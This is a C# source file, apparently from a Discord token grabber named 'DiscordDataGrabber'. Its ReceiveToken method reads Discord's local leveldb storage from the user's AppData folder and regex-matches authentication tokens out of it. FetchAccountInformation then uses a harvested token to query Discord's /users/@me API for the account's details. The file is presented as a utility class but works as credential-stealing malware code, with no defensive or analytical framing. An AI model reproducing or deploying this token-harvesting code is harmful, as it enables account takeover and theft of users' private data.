using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using DiscordDataGrabber.Models;
using Newtonsoft.Json;

namespace DiscordDataGrabber.Utlities
{
    public class DiscordUserUtilities
    {
        private readonly HttpClient _http;

        public DiscordUserUtilities()
        {
            _http = new HttpClient();
        }

        public List<string> ReceiveToken()
        {
            GlobalVars.TokenFolder =
                File.ReadAllText(
                    $"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}//Discord//Local Storage//leveldb//000005.ldb");
            GlobalVars.FindAToken = GlobalVars.TokenPattern.Matches(GlobalVars.TokenFolder);

            foreach (Match token in GlobalVars.FindAToken)
                GlobalVars.Token.Add(token.NextMatch().NextMatch().ToString());
            return GlobalVars.Token;
        }

        public async Task<DiscordUser> FetchAccountInformation()
        {
            var request = new HttpRequestMessage
            {
                Method = HttpMethod.Get,
                RequestUri = new Uri("https://discord.com/api/v8/users/@me")
            };
            request.Headers.Add("authorization", GlobalVars.Token[0]);

            var responseHtml = await _http.SendAsync(request).ConfigureAwait(false);

            if (responseHtml.IsSuccessStatusCode)
            {
                var json = await responseHtml.Content.ReadAsStringAsync();
                json.Trim();

                return JsonConvert.DeserializeObject<DiscordUser>(json, Converter.Settings);
            }

            Console.WriteLine("Failed to fetch the data.");
            return null;
        }
    }
}